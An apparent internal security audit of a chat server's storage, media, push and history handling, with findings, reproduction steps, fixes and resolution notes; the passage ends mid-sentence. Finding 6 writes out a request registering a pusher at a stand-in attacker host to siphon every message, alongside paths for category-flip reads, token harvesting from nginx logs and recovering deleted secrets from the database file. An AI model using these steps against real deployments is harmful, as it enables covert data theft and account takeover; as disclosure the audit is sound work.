# Data, storage, history and side-channel audit — September 2026

Scope: what happens **beneath** the request path — the store's queries, the search
index, history across permission changes, redaction and edit residue, media, push,
derived/aggregate data, and data at rest and in transit to operators.

Branch audited: `server` **`main`** @ `c9a1e12`. Read-only; this branch
(`audit/data-path`) contains this document and nothing else.

**Deliberately out of scope**, because they are covered elsewhere and should not be
re-litigated here:

- Endpoint-by-endpoint request-path authorization — a separate worker owns it.
- `wt/server-roomleak/docs/membership-vs-visibility.md` (`fix/joined-rooms-leak`) —
  endpoint-level membership-vs-visibility.
- `wt/server-authhard/docs/auth-hardening-2026-09.md` (`harden/auth`) — the auth path.
- `harden/redact-homoglyphs` — a related redaction fix is in flight there; everything
  below is against `main`.

Where this audit **contradicts or corrects** one of those documents, or the brief
that commissioned it, it says so explicitly rather than quietly disagreeing. There
are three such corrections: the category exemption (finding 2), the media-id RNG
premise (finding 3), and the IP-privacy verdict (verified correct, and it passes).

---

## The premise, restated

Every channel is created `visibility="public"` and made "private" by a single
`@everyone DENY VIEW_CHANNEL` override — `ChannelSettings.qml:597` defines
`isPrivate` as exactly `(deny & 0x1) != 0`. `list_public_rooms()` ignores overrides,
so auto-join force-joins every user into every private channel on every boot.
**`membership = 'join'` therefore means nothing about access.** The only real access
predicate is `PermissionsEngine::can(user, room, permission::kViewChannel)`.

---

## Summary

### Must fix before this RC

| # | Finding | Severity |
|---|---|---|
| 1 | Redacting an edited message leaves the edit's text fully readable | **High** |
| 2 | Category rooms bypass VIEW_CHANNEL; MANAGE_CHANNELS converts a private channel into one | **High** |
| 3 | No per-room ACL on media; `require_auth` does not add one | **High** |
| 4 | Session tokens land in nginx access logs via media URLs | **High** |
| 5 | Deploy template ships PBKDF2 at 4,096 iterations | **High** |
| 6 | Push: default-open gateway allowlist is a self-serve exfiltration feed | **High** |
| 7 | Push: a hostile gateway deletes any user's pushers server-wide | **High** |
| 8 | No `secure_delete`/`VACUUM`: pre-v7 tokens, redacted text and purged ICE candidates live on in free pages | **Medium-High** |
| 9 | Pre-edit plaintext is served to every reader forever, in a one-click UI | **Medium-High** |

### Should fix

| # | Finding | Severity |
|---|---|---|
| 10 | `next_batch` is the raw global stream head — an activity oracle | Medium |
| 11 | Media blobs are never deleted, by redaction or by room deletion | Medium |
| 12 | `push_queue` delivers pre-redaction plaintext after a redaction | Medium |
| 13 | TURN static auth secret is passed on the command line | Medium |
| 14 | No security headers + attacker-controlled `Content-Type` served inline | Medium |
| 15 | No encryption at rest and no file mode ever set on the DB | Medium |
| 16 | Client IP addresses reach the operator log stream | Medium |
| 17 | Push payloads default to full plaintext rather than `event_id_only` | Medium |
| 18 | Presence includes users who left or were server-banned | Low-Medium |
| 19 | `PUT /voice/state` has no membership check at all | Low-Medium |
| 20 | No backup script exists; WAL makes naive backups torn as well as unencrypted | Low-Medium |

### Noted

| # | Finding | Severity |
|---|---|---|
| 21 | `get_state_events` is the one read of `events` with no `signal_to` filter | Low |
| 22 | Signalling privacy depends on the client setting `content.to`; unenforced | Low |
| 23 | The signalling prune does not run at startup, contrary to its comment | Low |
| 24 | `RAND_bytes` return value discarded when minting media ids | Low |
| 25 | Event-existence oracle via edit-target error codes | Low |
| 26 | `m.direct` peer side not filtered by membership | Low |
| 27 | Audit log bypasses VIEW_CHANNEL by design — undocumented | Low |
| 28 | No history-visibility horizon: access granted = all history | Low |
| 29 | Assorted values at `info`: media ids, OIDC subjects, nicknames, gateway URLs | Low |

Plus **cross-reference items** already fixed on `fix/joined-rooms-leak` but still live
on `main` — see "Must land before the RC".

---

## Status of findings 10–28, as of 19 September 2026

Branch `harden/audit-data-path`, off `main` @ `ad993a2`. Each finding below
carries a **RESOLUTION** block with the reasoning; this is the index.

| # | Status | Note |
|---|--------|------|
| 10 | **Blocked** | Design recorded. Needs a migration number for the token key — ask before taking one. |
| 11 | **Fixed** | New media reaper. Ships in **dry run**; arm it after a release. |
| 12 | Already fixed | Merge train (v22 + redaction drains the queue). |
| 13 | Already fixed | `deploy` repo. |
| 14 | Already fixed (server) | nginx half is in the `deploy` repo, still commented out. |
| 15 | Already fixed | `deploy/setup.sh`. |
| 16 | **Partly fixed** | `redact_ip_for_log()` landed + tested; 2 call sites in `AuthHandler` handed to `harden/audit-request-path`. |
| 17 | Already fixed | Merge train. |
| 18 | **Fixed** | Presence filtered to joined, non-server-banned. |
| 19 | **Fixed** | And the finding **understated it** — see its block. |
| 20 | Already fixed | `deploy/backup.sh`. |
| 21 | **Fixed** | Subquery too, not just the outer WHERE. |
| 22 | Handed off | Enforcement point is `EventHandler`'s send path, out of this branch. |
| 23 | **Fixed** | Sweep now runs at startup, as its header always claimed. |
| 24 | **Fixed** | No test; reason given. |
| 25 | Out of scope | `EventHandler`, owned elsewhere. |
| 26 | **Declined — finding is wrong** | The recommended change deletes the DM from `m.direct` entirely. |
| 27 | **Documented, not filtered** | Recommendation taken exactly. Member-count nit fixed. |
| 28 | **Decision for Josh** | Three options written up; no code change. |

Two corrections to this document are argued in place: **19** (the reaper cannot
catch the offender, because the endpoint refreshes its own heartbeat, so the
window is unbounded rather than 10–60 s) and **26** (the suggested one-line fix
is a regression, not a cosmetic improvement).

---

# MUST FIX BEFORE THIS RC

## 1. Redacting an edited message leaves the edit's text fully readable — HIGH

**Verified empirically**, not inferred — probe run against this worktree's own build.

`SqliteStore::redact_event` (`src/store/SqliteStore.cpp:1261`) strips exactly one
row, the event id it was given:

```sql
UPDATE events SET content = '{}', edited_by = NULL, redacted_by = ?
WHERE event_id = ? AND redacted_by IS NULL
```

It handles the case where the redacted event **is** a replacement (it re-resolves the
target, `:1311`). It does **not** handle the case where the redacted event **has**
replacements. Each `m.replace` is an ordinary `m.room.message` row with its own event
id, and `get_room_events_paginated` (`:1060`) selects every event in the room with no
type and no `replaces` filter. The replacements therefore survive the redaction
untouched, carrying the full text in both `body` and `m.new_content.body`.

**Concrete path — any user, no privilege, ~15 seconds:**

1. Alice posts a message in `#general`.
2. Alice edits it, and the edit is where the sensitive text lands — the commonest way
   this happens is pasting the wrong buffer into an edit box.
3. Alice notices and uses **Delete message**. Her client shows it gone; so does
   everyone else's, because the original row is now `{}`.
4. Bob runs `GET /_matrix/client/v3/rooms/{room}/messages?dir=b&limit=100` with his
   own ordinary token. The `m.replace` event is in the chunk, content intact.

Probe output (event ids abbreviated):

```
$mZuW… type=m.room.redaction  content={"redacts":"$6yEf…"}
$SiCL… type=m.room.message    content={"body":"* AWS_SECRET_ACCESS_KEY=hunter2",
                                       "m.new_content":{"body":"AWS_SECRET_ACCESS_KEY=hunter2",…},
                                       "m.relates_to":{"event_id":"$6yEf…","rel_type":"m.replace"}}
$6yEf… type=m.room.message    content={}          ← the "redacted" message
```

The client makes this worse rather than better: `MessageModel` suppresses a
replacement only when it can pair it with its original (`appliedEdits`). Here the
original is a redacted tombstone, so the replacement is liable to render as an
ordinary standalone message rather than being hidden.

**Severity: High.** Redaction is the product's only "make it go away" control, users
reach for it in exactly the panic case, and it silently fails to remove the text a
large fraction of the time it matters. No permission, no race, one authenticated GET.

**Why it was missed — coverage gap.** `tests/test_regressions.cpp:1458`
(`Redaction.TargetContentIsActuallyRemoved`) redacts an **unedited** message. `:2170`
(`RedactingAnEditRollsBackToThePreviousVersion`) redacts the **edits**. No test
redacts a message that *has* surviving replacements — the exact composition of two
features that were each tested alone.

**Fix.** In `redact_event`, after stripping the target, find every surviving event
whose `m.relates_to` is an `m.replace` of that target and redact each in the same
transaction. `reresolve_edit_locked` (`:1223`) already has the candidate-finding
query; reuse it to return the whole set rather than just the newest. Add the missing
regression test.

---

## 2. Category rooms bypass VIEW_CHANNEL — and a private channel can be turned into one — HIGH

Two prongs of the same hole.

### 2a. A category is exempt from VIEW_CHANNEL at four sites

```
src/sync/SyncEngine.cpp:249    initial sync:      !is_category_room(...) && !perms.can(...) → skip
src/sync/SyncEngine.cpp:344    incremental sync:  is_category_room(...) || perms.can(...)
src/api/RoomHandler.cpp:81     can_read_room():   if (is_category_room(...)) return true;
src/sync/SyncEngine.cpp:17     the predicate itself
```

`can_read_room` gates `/rooms/{id}/state`, `/state/{type}` and `/members`
(`RoomHandler.cpp:754, 791, 823`). So for a category room **every authenticated user**
gets: full room state, the complete member list, the last `kDefaultTimelineLimit` = 20
timeline events on initial sync, every subsequent event on incremental sync, a
`prev_batch` token, and live unread/highlight counts — regardless of any override.

The prior audit dismissed this in one parenthesis: *"It omits the category exemption,
which is harmless — categories hold no messages."* **That assumption is not enforced
anywhere.** `src/api/EventHandler.cpp` contains the string "category" **zero times**.
`handle_send_event` gates on VIEW_CHANNEL + SEND_MESSAGES on the room and nothing
else. A category accepts `m.room.message` exactly like any other room. The push
auditor reached the same conclusion independently from the other side: `PushService`
has no category bypass, so push correctly withholds a message that `/sync` fans out.
The two components disagree, which is itself the tell.

So an `@everyone DENY VIEW_CHANNEL` override on a category does nothing. A "private
category" is not private.

### 2b. One unaudited request converts a private channel into a category

`handle_set_state` (`RoomHandler.cpp:1230`) maps `m.room.type` to
`required = permission::kManageChannels` at **room scope**, refuses it only on DMs
(`:1255`), validates **nothing** about the content, and does **not** require
VIEW_CHANNEL on the room being modified.

**Concrete path:**

1. Mallory holds a "Builder" role granting `MANAGE_CHANNELS` server-wide — which is
   what that permission is *for*, and it is not in `kEveryoneDefault`
   (`protocol/include/bsfchat/Permissions.h:45`), so this is a deliberately-granted
   non-admin role. She is denied `VIEW_CHANNEL` on `#leadership`.
2. She already has the room id: auto-join put it in her `room_members`, and on `main`
   `GET /joined_rooms` hands it to her outright (see "Must land").
3. `PUT /_matrix/client/v3/rooms/!leadership/state/m.room.type` body
   `{"type":"category"}` → 200.
4. Her next `/sync` returns `#leadership` with full state, the member list and the
   last 20 messages. Every further message arrives live.
5. `PUT .../m.room.type` body `{}` → it is a normal private channel again.

It is **reversible** and **unaudited**: `handle_set_state` audits only
`bsfchat.channel.permissions` (`is_channel_override`, `:1455`). Granting herself
`VIEW_CHANNEL` directly would have achieved the same read *and left an audit record*
(`audit_channel_override_change`). The category flip is the quieter route to the same
data, which is the opposite of what you want.

`/rooms/{id}/messages` does **not** carry the exemption (`EventHandler.cpp:418`), so
deep back-pagination stays blocked. The leak is "full state + member list + last 20
messages + everything from now on", not "all history". That is the honest bound, and
it is still a complete compromise of the channel.

**Severity: High.** 2a alone exposes every category to every user; 2b turns a mid-tier
role into a read of any channel on the server.

**Fix.** Two independent changes, both wanted:
- Narrow the exemption to what the sidebar actually needs. A category should
  contribute its **`m.room.name`/`m.room.type` state only** — not its timeline, not
  its member list, not counts, not a `prev_batch`. Today the exemption is a blanket
  `return true` where a field-level projection is the actual requirement.
- Gate `m.room.type` harder: require `VIEW_CHANNEL` **in addition to**
  `MANAGE_CHANNELS` on the target room, refuse converting a room that already holds
  `m.room.message` events, and route the write through the audit log. The
  `may_edit_role_definitions` precedent (`Permissions.h:57-66`) already makes the
  argument — *"MANAGE_ROLES is the permission an owner hands to a trusted-but-not-admin
  builder; it must not be a one-request path to owning the server."* The identical
  sentence is true of `MANAGE_CHANNELS` and reading every channel.

---

## 3. No per-room ACL on media; `require_auth` does not add one — HIGH

The `media` table (`src/store/SqliteStore.cpp:250`) has columns `media_id, uploader,
content_type, filename, file_size, file_path, created_at` — **no room**. Nothing
anywhere records which channel a media item was posted in.
`src/api/MediaHandler.cpp` never includes `auth/Permissions.h` and never constructs a
`PermissionsEngine`. `handle_download` performs exactly one authorization step
(`:250`): *is this a live token for some user*. The resulting `user_id` is discarded
without being bound to a variable.

**So any authenticated account can download any media object on the server, given the
id.** A valid token is a server-wide media capability.

The comment at `MediaHandler.cpp:241-244` is the sharpest evidence that this was
misunderstood rather than accepted. It correctly names the risk — *"capability-URL
security: no revocation, no per-room ACL"* — and then says *"When `require_media_auth`
is on, a valid access token is required."* The implication is that the switch
mitigates the listed problems. **It does not.** Turning auth on adds "must be *a*
user"; revocation and the missing per-room ACL are exactly as absent as before. The
risk is documented and the documented mitigation is not one.

**Concrete path — the realistic one is revocation, not read-up:**

1. `#general` is public. Alice posts `screenshot.png` → `mxc://…/a1b2…`. Bob is a
   member and his client has the event.
2. The channel is later locked down with `@everyone DENY VIEW_CHANNEL`, or Bob loses
   the role. Bob's `/sync` correctly stops showing it. The UI does the right thing.
3. Bob recovers `a1b2…` from his client cache, his scrollback, or a screenshot of the
   URL, and issues
   `GET /_matrix/media/v3/download/bsfchat.com/a1b2…?access_token=<his own token>`.
4. **200, full bytes. Permanently.** No code path can refuse.

Making a channel private is advertised as a confidentiality control and, for
attachments already posted, it is purely cosmetic.

**In fairness — the live read-up surfaces are genuinely closed.** A user who was
*never* in the channel cannot learn the id: `/sync` (`SyncEngine.cpp:250, 345`),
search (`SearchHandler.cpp:132`), push (`PushService.cpp:94`), `/messages`
(`EventHandler.cpp:418`) and room state (`RoomHandler.cpp:1322`) all filter on
VIEW_CHANNEL, and the 404 for "no such id" is indistinguishable from "not yours"
(`MediaHandler.cpp:287` vs `:301`). That is why this is High and not Critical.

**Fix.** Bind media to a room at **attach** time (upload is not room-scoped):
`handle_send_event` extracts `content.url` / `content.info.thumbnail_url` and records
the `(media_id, room_id)` pair. `handle_download` then keeps the `user_id` from
`authenticate_media` and requires `VIEW_CHANNEL` on that room. Decide the unattached
and avatar cases **explicitly** — "no room recorded" must not silently mean "public",
or the backfill gap becomes the bypass. There is currently no regression test
asserting a denied user is refused a media id from that room; add one.

### The media-id RNG question — the brief's premise is wrong, and that is good news

The brief asked me to assess media minted before the RNG fix. **Media was never
affected.** Verified directly rather than inherited:

- `MediaHandler::generate_media_id()` (`src/api/MediaHandler.cpp:121-129`) draws 16
  bytes from `RAND_bytes` and hex-encodes them — 128 bits from the OpenSSL CSPRNG. It
  is the only producer on the upload path (`:196`).
- `bsfchat::generate_media_id()` in the protocol library
  (`protocol/src/Identifiers.cpp:181`) genuinely has **no caller** anywhere — server,
  client, protocol or tests. Dead code.

So no production media needs re-minting, and media should **not** be listed alongside
access tokens, event ids and room ids in the `671e803` remediation set. For contrast,
had the protocol generator been wired in: a 2³² effective keyspace against ~10⁴
objects is ~430,000 blind guesses to hit something, about seven minutes at 1,000
req/s — and there is no rate limit on the download route. Worth having checked.

---

## 4. Session tokens land in nginx access logs via media URLs — HIGH

Two halves, each individually documented, jointly fatal. Found independently by two
lines of the audit.

**Half one — the server accepts the token in the query string.**
`src/api/MediaHandler.cpp:232-234` falls back to `?access_token=`, and the client puts
it there on **every** media URL (`client/src/util/MediaUrl.h:38-41`) because QML
`Image.source` cannot attach an `Authorization` header. That file's own comment
(`:20-22`) says a token in a query string can be recorded by access logs.

**Half two — the shipped nginx config does nothing about it.**
`deploy/nginx/bsfchat.conf.template` has **no `access_log` directive, no custom
`log_format`, and no `map` scrubbing the query string** in any of its four server
blocks. nginx therefore uses the built-in `combined` format, whose `"$request"` field
is the full request line including the query.

**Path:**

1. Any user views any image in any channel.
2. The client requests
   `GET /_matrix/media/v3/download/chat.example.com/<id>?access_token=<live token>`.
3. nginx writes that line verbatim to `/var/log/nginx/access.log`.
4. Anyone who can read that file — the operator, a log shipper, logrotate archives, a
   backup, an SRE with journal access — holds a **working bearer token**.
   `get_user_by_token` (`SqliteStore.cpp:409-416`) *renews on use*, so a token in a
   week-old log line stays alive as long as the victim keeps using the app.

**Severity: High.** Full account takeover, reachable by exactly the actor this audit
is scoped to, firing on ordinary use with no attacker action, and invisible — nothing
in the app log, nothing in the DB. It also chains with finding 14 to upgrade from
"operator reads the log" to "any user takes over any other user".

**Fix.** Immediate and shippable today: add a `map $request_uri $loggable_uri` to the
nginx template that strips `access_token=`, plus a `log_format` using it. Durable:
issue short-lived, single-object, VIEW_CHANNEL-scoped media tokens at render time
instead of reusing the session bearer — which is the design `MediaUrl.h:22` already
calls for, and which closes findings 3 and 4 together.

---

## 5. Deploy template ships PBKDF2 at 4,096 iterations — HIGH

`deploy/config/server.toml.template:34`:

```toml
password_hash_cost = 12
```

`cost` is an exponent — `int iterations = 1 << cost;` (`src/auth/LocalAuth.cpp:48`).
So 12 means **4,096 iterations** of PBKDF2-HMAC-SHA256. Compare:

- `config/bsfchat-server.example.toml:76` → `password_hash_cost = 19` (524,288), with
  a comment citing OWASP.
- `deploy/config/identity.toml.template:32` → `password_hash_iterations = 600000`.
- The startup warning fires only **below** 12 (`src/core/Config.cpp:239-241`), so 12
  passes silently by exactly one step.

**Path:** an operator follows `deploy/README.md`, runs `setup.sh`, and gets a
production server storing local-account passwords **128× weaker than the documented
default and 146× weaker than the sibling service in the same compose file**. Anyone
who obtains the DB file (findings 8, 15, 20) cracks these at GPU rates in the hundreds
of millions of guesses per second; any password in a wordlist falls immediately. The
16-byte per-user salt rules out rainbow tables but barely matters at this count.

**Severity: High**, and it is a one-character fix.

**Fix.** Set the deploy template to 19. Existing hashes record their own cost and are
transparently upgraded at next login (`src/api/AuthHandler.cpp:275-282`), so the change
is safe and self-healing. Separately raise the `Config.cpp:239` warning threshold —
warning only below 12 endorses 12.

---

## 6. Push: default-open gateway allowlist is a self-serve exfiltration feed — HIGH

`PushConfig::allowed_gateway_prefixes` defaults to an **empty vector**
(`src/core/Config.h:160`); empty means "any absolute http(s) URL"
(`src/api/PushHandler.cpp:148-161`) and produces only a startup **warning**
(`src/core/Config.cpp:320-325`). `deploy/config/server.toml.template` has no `[push]`
section at all — confirm before the RC whether that means push is off in production or
on and default-open.

The payload is not a teaser. `PushService.cpp:124-159` sends the **verbatim
client-supplied event content** — full plaintext `body`, `formatted_body`, attachment
`mxc://`, `filename`, size and mimetype — plus sender MXID, `sender_display_name`,
room id, event id and the recipient's unread count.

**Path:**

1. Any authenticated user: `POST /_matrix/client/v3/pushers/set` with
   `{"kind":"http","app_id":"x","pushkey":"x","data":{"url":"https://collect.attacker.tld/n"}}`.
2. `PUT /_matrix/client/v3/bsfchat/rooms/{id}/notify_level {"level":"all"}` in a loop
   over every room in their `/sync`.
3. Every message in every channel they can view is POSTed in full, forever, to a
   server they control.

The point is not that they could also read it in the client. It is that this is
**invisible and persistent**: pusher registration writes no audit record (`AuditLog`
is never called from `PushHandler.cpp`), no moderator surface shows it, and it keeps
running with the client closed. It also moves message content to an uncontrolled third
party with no operator consent — a compliance problem independent of any attacker.

**Fix.** Make `push.allowed_gateway_prefixes` **mandatory** when `push.enabled` —
refuse to start, or force `push.enabled = false`, rather than warn. Set it in
`deploy/` before the RC. Audit-log pusher registration and removal. Also require
`https://` (`PushHandler.cpp:131-135` accepts cleartext today, which additionally lets
an on-path attacker inject finding 7's primitive) and compare the allowlist on
scheme+host+port rather than as a raw string prefix (`:163-167`, where
`https://push.example.com` without a trailing slash also authorises
`https://push.example.com.evil.tld/`).

---

## 7. Push: a hostile gateway deletes any user's pushers server-wide — HIGH

`PushService.cpp:241-249` honours the gateway's `rejected` list by calling
`store_.delete_pushers_by_pushkey(pushkey)`, and `SqliteStore.cpp:2186-2192` is
`DELETE FROM pushers WHERE pushkey = ?` — **unscoped by user and unscoped by the URL
that answered**. The rejection list is never checked against the pushkeys this request
actually carried.

**Path:** the attacker registers a pusher at their own server (free, per finding 6),
receives one push, and replies `200 {"rejected":["<any pushkey>", …]}`. Every matching
row on the server is deleted, for every user. Even with a correct allowlist, one
compromised gateway gets the same primitive over the whole user base.

Integrity and availability rather than disclosure, but it is a cross-user primitive
reachable by any account, so it belongs on the RC gate.

**Fix.** Honour a rejection only for pushkeys present in *this* request's `devices`
array, and scope the delete to `(user_id, app_id, pushkey)` taken from the queue row.

---

## 8. No `secure_delete`/`VACUUM`: deleted secrets live on in free pages — MEDIUM-HIGH

`src/store/SqliteStore.cpp:147-149` sets exactly three pragmas — `journal_mode=WAL`,
`foreign_keys=ON`, `busy_timeout=5000`. There is **no `PRAGMA secure_delete`** and
**no `VACUUM`** anywhere in `src/`, `scripts/` or the `Dockerfile`. SQLite returns
deleted and shrunk pages to the freelist without overwriting them.

Three separate deletions are therefore logical, not physical:

- **Pre-v7 plaintext access tokens.** Migration v7 (`src/store/Migrations.cpp:274-348`)
  does exactly what it claims — re-hashes each token and `DROP TABLE access_tokens`
  (`:333`). But the dropped pages keep the plaintext. Worse, the migration gave those
  sessions a fresh 90-day expiry (`:277`), so recovered tokens are plausibly still
  live.
- **Redacted message bodies.** `redact_event` sets `content = '{}'`; the old bytes
  remain.
- **Purged call-signalling events — and this is the pointed one.** The v17 IP-privacy
  purge deleted historical signalling rows *specifically because they carried
  participants' LAN and public IP addresses*. Those rows were deleted, not shredded.
  **The ICE candidates the v17 migration exists to destroy are very likely still
  recoverable from the production DB file today.**

**Path:** `strings /data/bsfchat.db` (and `bsfchat.db-wal`) on the production host, or
in any backup of it.

**Severity: Medium-High.** It needs file access — but "operator, backup, or stolen
volume" is precisely the threat this section of the audit is about, and the third item
means a shipped privacy feature is not actually finished. The fix is cheap and there
is an obvious window for it.

**Fix.** Run `VACUUM` once as part of the RC upgrade — it rewrites the file and drops
the freelist — and set `PRAGMA secure_delete = ON` at open so future deletes,
including the recurring signalling prune, actually zero their pages. Note in the
runbook that **existing backups still carry all of the above** and should be rotated
out.

---

## 9. Pre-edit plaintext is served to every reader, forever, in a one-click UI — MEDIUM-HIGH

**Verified empirically.**

`read_event_row` (`src/store/SqliteStore.cpp:136`) attaches the original row's content
to every read of an edited message:

```cpp
unsigned_data["bsfchat.original_content"] = ev.content.data;
```

`unsigned_data` is serialized as `j["unsigned"]` (`protocol/src/MatrixTypes.cpp:132`),
and every timeline read goes through `read_event_row` — `/messages`, initial `/sync`,
incremental `/sync`, and `/search` results (`SearchHandler.cpp:206` → `get_event_by_id`
→ `kEditJoin`). Probe output:

```
[PROBE-1] unsigned.bsfchat.original_content.body = AWS_SECRET_ACCESS_KEY=hunter2
```

…for a message whose current body is `"oops, ignore that"`.

And it is not merely on the wire. The desktop client consumes it
(`client/src/model/MessageModel.cpp:499-506`) into `entry.history`, surfaced by
`MessageBubble.qml:331` → `MessageView.qml:2117` as a **"Show edit history"**
context-menu item. The path is: right-click any edited message → read every prior
version. No curl, no protocol knowledge. Separately, each intermediate `m.replace` is
*also* an ordinary timeline event, so every version is readable even without the
bundle.

This is not a bug in the narrow sense — it is a deliberate, tested, shipped feature,
and `MessageModel.cpp:533-550` shows a second dependency (mention re-routing reads
`original_content` to decide who was badged by the pre-edit text). The finding is that
**editing is presented to users as removal and is purely additive**, with no way to
retract text short of redacting the whole message — which, per finding 1, does not work
either. The two compose into: *there is currently no reliable way for a user to un-say
something.*

**Fix.** Decide the product question first; the mechanism follows.
- If edit history is meant to be public, say so in the UI at edit time, so users know
  the edit box is not a redaction.
- Otherwise stop emitting `bsfchat.original_content` by default — serve it only to the
  sender and to `MANAGE_MESSAGES` holders, or drop it and have the client rebuild
  history from the replacement events it already receives. Mention re-routing does not
  need the original in `unsigned`; it can be computed server-side at edit time, where
  the permission context already is.
- Either way, redaction must clear it. Today it does, but only as a side effect of
  `edited_by = NULL`.

---

# SHOULD FIX

## 10. `next_batch` is the raw global stream head — a volume-and-timing oracle — MEDIUM

`get_events_since` returns `out_stream_head = next_stream_position_ - 1`, the
**global** counter (`SqliteStore.cpp:1462`), and `build_incremental_sync`
(`SyncEngine.cpp:326-333`) publishes it as `next_batch` whenever the scan was not
limit-truncated — i.e. essentially always. `build_initial_sync:239` does the same.

**Path:** poll `GET /sync?timeout=0&since=sN` once a second and record the integer.
`delta - (events actually received)` is the exact count of events that occurred in
rooms the caller cannot see, timestamped to the second. Over a day this reconstructs
the activity profile of every private channel — when the exec channel is busy, when an
incident starts, when an off-hours conversation happens. Combined with the typing leak
(see "Must land"), much of that volume attributes to specific rooms and people.

Being fair to the code: `SyncEngine.cpp:320-333` shows this was a *deliberate* fix for
a real bug — a token pinned to the highest visible row read as "no progress" to
`SyncBackoff` and walked idle clients out to a 60 s poll interval. **Any fix must not
regress that.**

**Fix.** Keep the token monotonic and always-advancing but stop it being the plaintext
global counter: HMAC or authenticated-encrypt `{user_id, position}` with a server key
so the client can round-trip it without reading it. Stateless, and a small change.

> ### RESOLUTION — NOT FIXED. Design below; blocked on a migration number.
> `harden/audit-data-path`, 19 Sep 2026.
>
> **Confirmed still live** and confirmed fixable without touching the client:
> `SyncLoop.cpp:98` stores `next_batch` as an opaque `QString` and only ever
> compares it for equality, and `MatrixClient` round-trips it verbatim. Nothing
> on either side of the wire reads the number.
>
> **The constraint the obvious fixes all miss.** The oracle is the *delta*, not
> the value. So every order- or delta-preserving encoding fails, including the
> two that look cheapest: `pos + k` preserves deltas exactly, and `pos XOR k`
> leaks them almost as badly, because consecutive tokens give `p1^p2` and the
> increments are small, so the low bits of the difference fall straight out.
> The fix has to be a keyed pseudorandom permutation, and that means a key.
>
> **Construction.** One AES-256 block, which is exactly "apply the PRP once":
>
>   * plaintext block = 8 bytes big-endian stream position ‖ 8 bytes of
>     `HMAC-SHA256(key, user_id)`, truncated;
>   * token = `"t_"` + 32 hex characters of the ciphertext;
>   * inbound: decrypt, check the 8-byte tag against the caller, reject on
>     mismatch — which also stops a token being replayed as another user.
>
> Deterministic, and that property is load-bearing: the same `(user, position)`
> always yields the same string, so `SyncBackoff`'s `tokenAdvanced` signal keeps
> meaning what it means today. An always-changing token would be the mirror-image
> regression — it disables the guard against an endpoint answering 200
> unconditionally, which is a deliberate protection with its own long comment.
>
> **Compatibility.** Keep parsing legacy `s<N>` on the way in — clients hold
> persisted tokens — and emit only the new form. `prev_batch` stays `s<N>` and
> `/messages?from=` is untouched: that is a room-scoped position of an event the
> caller can already see, not the global head, so it is not this oracle.
>
> **What actually blocks it: where the key lives.** It has to survive a restart,
> or every client on the deployment is forced into a full initial sync on every
> upgrade. There is no general-purpose server secret today — the only secrets in
> `Config` are voice-specific and optional, so a mesh-only deployment has none to
> derive from. Two options:
>
>   * a one-row `server_secrets` table, generated on first use. Correct, and it
>     needs a migration number, which is reserved for Josh to allocate;
>   * a row in the existing `server_state` table under a private `event_type`.
>     This needs no migration and is safe *today* — nothing serves `server_state`
>     generically, the write path allowlists exactly two event types
>     (`RoomHandler.cpp:1399`) and every read is by explicit type. But it puts a
>     secret in a table whose other occupants are all client-visible documents,
>     which is a trap set for whoever next writes a generic reader over it.
>
> The first is right and the second is a shortcut that would be wrong within a
> year. Not taken unilaterally: **this needs a migration number**. Roughly a
> day's work once it has one, mostly tests.

## 11. Media blobs are never deleted — MEDIUM

`SqliteStore::delete_media` (`:2617`) and `MediaStorage::remove` have **zero callers in
`src/`**. `redact_event` destroys the `mxc://` inside the event content (good, and why
this is Medium not High) but leaves the blob and its row. `delete_room` (`:568-590`)
removes `read_markers`, `event_mentions`, `events`, `room_members`, `rooms` — no
`media`.

**Path:** Bob notes the mxc URI. Alice deletes the message; her client says "deleted";
she believes the image is gone. Bob replays the URL with his own token: 200,
indefinitely. Deleting the whole channel does not help. There is no erasure path and no
orphan reaper, so `data/media/` grows monotonically for the life of the deployment —
and an `insert_media` failure after a successful upload (`MediaHandler.cpp:199` vs
`:202`) orphans a blob nothing will ever collect.

**Fix.** On redaction, parse the pre-strip content for `url` / `info.thumbnail_url`,
and if no surviving event references that mxc, call `delete_media` +
`storage_->remove`. Same in `delete_room`. Add a TTL reaper. Shares the
reference-tracking work with finding 3 — do them together.

> ### RESOLUTION — FIXED, shipping in dry run.
> `harden/audit-data-path`, 19 Sep 2026. New: `src/storage/MediaReaper.{h,cpp}`,
> `SqliteStore::find_orphaned_media`, four `[media]` config keys, 11 tests in
> `tests/test_media_security.cpp`.
>
> **Built as a sweep, not as a delete at the redaction site.** The audit
> recommends the latter; it is the wrong shape for three reasons, all of which
> are now argued in `find_orphaned_media`'s header:
>
>   1. a blob is a file and a redaction is a transaction. `redact_event` and
>      `delete_room` work inside `BEGIN IMMEDIATE`, and no `unlink()` can be
>      rolled back — so a rolled-back redaction would have already destroyed the
>      image;
>   2. neither site can answer the question. One object can be named by events
>      in several rooms, so "this event was redacted" is not "this object is
>      unreferenced". Getting this wrong deletes a picture that is still on
>      screen in another channel, and there is a test for exactly that;
>   3. only a sweep collects the orphan class those sites cannot see at all —
>      an upload that was never attached to anything, which is the case
>      `handle_upload`'s failure path already apologises for in a comment.
>
> One mechanism therefore covers redaction, room deletion and abandoned uploads,
> and it is idempotent, which the per-site version would not have been.
>
> **Reference sources are three, not one.** `media_refs` is the obvious one.
> `users.avatar_url` is the second and omitting it would delete every avatar on
> the server on the first sweep — avatars are room-less by design, so they look
> exactly like orphans. The third is `server_state`, which holds server-scoped
> documents that never pass through `insert_event` and so are never in
> `media_refs`; it is scanned in C++ with `media_uris_in_content()`, the same
> extractor `insert_event` indexes with, so the two cannot drift. All three have
> a test.
>
> **Ordering is blob-then-row, deliberately.** Interrupted that way leaves a row
> with no bytes: the object 404s and the next sweep finishes the job. The other
> order leaves bytes with nothing pointing at them, which is permanent — the
> sweep's own input is the media table — and it is a permanent leak of precisely
> the data the sweep exists to destroy. Tested.
>
> **`media_orphan_grace_hours` is not a tuning knob.** `POST /upload` and the
> `PUT /send` that names the object are two requests, and in between the object
> is indistinguishable from an orphan. Default 24 h.
>
> **`media_reaper_dry_run` defaults to TRUE and should stay true for one
> release.** This is the only code in the server that deletes user data from
> disk on a timer, and a wrong reference query fails silently and
> unrecoverably. In dry run every candidate is logged at `info` with its size,
> uploader and content type — filename deliberately withheld, it is user content
> — so an operator can read a night of it against their own corpus and satisfy
> themselves it names nothing they recognise before setting
> `media.reaper_dry_run = false`. The startup line says loudly which mode it is
> in. `TheShippedDefaultIsDryRunAndEnabled` pins both defaults, because a
> one-character change to either would otherwise be silent.
>
> **Known residue, deliberately not chased:** an object uploaded before this
> lands and orphaned before v21's backfill ran is collected on the first armed
> sweep, which is the intent; and the reaper does not touch the free pages the
